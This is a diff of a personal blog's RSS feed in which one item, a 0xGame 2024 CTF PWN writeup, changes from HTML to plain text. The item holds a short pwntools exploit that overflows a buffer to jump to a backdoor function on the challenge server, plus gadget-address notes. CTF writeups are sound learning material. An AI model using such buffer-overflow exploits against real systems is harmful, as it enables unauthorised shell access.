@@ -4,7 +4,7 @@
     <title>ycna07`s Blog</title>
     <link>https://ycna07.github.io/en/posts/writeups/</link>
     <description>Recent content on ycna07`s Blog</description>
-    <generator>Hugo -- 0.134.3</generator>
+    <generator>Hugo -- 0.120.3</generator>
     <language>en-US</language>
     <copyright>ycna07</copyright>
     <atom:link href="https://ycna07.github.io/en/posts/writeups/index.xml" rel="self" type="application/rss+xml" />
@@ -13,32 +13,7 @@
       <link>https://ycna07.github.io/en/posts/writeups/0xgame2024/</link>
       <pubDate>Tue, 15 Oct 2024 21:18:15 +0800</pubDate>
       <guid>https://ycna07.github.io/en/posts/writeups/0xgame2024/</guid>
-      <description>&lt;h1 id=&#34;pwn&#34;&gt;PWN&lt;/h1&gt;
-&lt;h2 id=&#34;week1&#34;&gt;Week1&lt;/h2&gt;
-&lt;h3 id=&#34;1testyourpwntool&#34;&gt;1.testyourpwntool&lt;/h3&gt;
-&lt;h3 id=&#34;2stackoverflow&#34;&gt;2.stackoverflow&lt;/h3&gt;
-&lt;p&gt;00007ffdad8c5320
-00007ffdad8c5358
-38
-backdoor：4012bd&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Python&#34; data-lang=&#34;Python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;47.97.58.52&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40001&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; payload&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x38&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00000000004012BD&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(payload)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x38&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00000000004012BD&lt;/span&gt;))
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20241006202956597.png&#34; alt=&#34;addr of system&#34;  /&gt;
-&lt;/p&gt;
-&lt;h3 id=&#34;5whereismybinsh&#34;&gt;5.whereismybinsh&lt;/h3&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20241008115415709.png&#34; alt=&#34;gadget&#34;  /&gt;
-&lt;/p&gt;
-&lt;p&gt;pop_rdi_ret:0x0000000000401323&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20241008120813482.png&#34; alt=&#34;code&amp;amp;flag&#34;  /&gt;
-&lt;/p&gt;
-&lt;p&gt;4.find_me&lt;/p&gt;
-&lt;p&gt;尝试ioexp
-查看libc.so.6版本&lt;/p&gt;</description>
+      <description>PWN Week1 1.testyourpwntool 2.stackoverflow 00007ffdad8c5320 00007ffdad8c5358 38 backdoor：4012bd from pwn import * io = remote(&amp;#39;47.97.58.52&amp;#39;, 40001) payload=b&amp;#39;a&amp;#39;*0x38+p64(0x00000000004012BD) io.send(payload) io.send(b&amp;#39;a&amp;#39;*0x38+p64(0x00000000004012BD)) io.send(&amp;#39;\n&amp;#39;) io.interactive() 5.whereismybinsh pop_rdi_ret:0x0000000000401323 4.find_me 尝试ioexp 查看libc.so.6版本</description>
     </item>
   </channel>
 </rss>
